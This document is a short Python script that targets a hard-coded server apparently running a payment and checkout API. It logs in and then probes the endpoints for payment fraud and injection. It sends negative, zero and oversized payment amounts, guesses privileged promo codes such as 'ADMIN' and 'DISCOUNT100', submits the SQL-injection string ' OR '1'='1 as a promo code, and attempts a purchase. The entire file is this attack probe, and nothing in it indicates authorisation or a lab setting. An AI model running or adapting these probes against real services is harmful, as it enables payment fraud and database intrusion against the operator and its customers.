import requests
import json

base_url = "http://155.212.216.201:8080"
s = requests.Session()
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
s.headers.update({
    "User-Agent": ua,
    "Content-Type": "application/json",
    "X-Requested-With": "mk",
})

# 1. Login
s.post(f"{base_url}/login", data={"username": "player_test42", "password": "SuperPassword123!"})

# Test /api/sbp/create
for amt in [100, 1000, 250000, -100, 0]:
    r = s.post(f"{base_url}/api/sbp/create", json={"amount": amt})
    print(f"/api/sbp/create (amt={amt}): status {r.status_code}, resp: {r.text}")

# Test /api/sbp/status
r_status = s.get(f"{base_url}/api/sbp/status")
print(f"/api/sbp/status: status {r_status.status_code}, resp: {r_status.text}")

# Test /api/v2/checkout/promo
for promo in ["WELCOME5", "VIP", "ADMIN", "MERCURY", "FREE", "TEST", "' OR '1'='1", "DISCOUNT100"]:
    r_promo = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": promo})
    print(f"promo '{promo}': status {r_promo.status_code}, resp: {r_promo.text}")

# Test /api/v2/checkout/pay
r_pay = s.post(f"{base_url}/api/v2/checkout/pay", json={"lot": 13537})
print(f"/api/v2/checkout/pay: status {r_pay.status_code}, resp: {r_pay.text}")
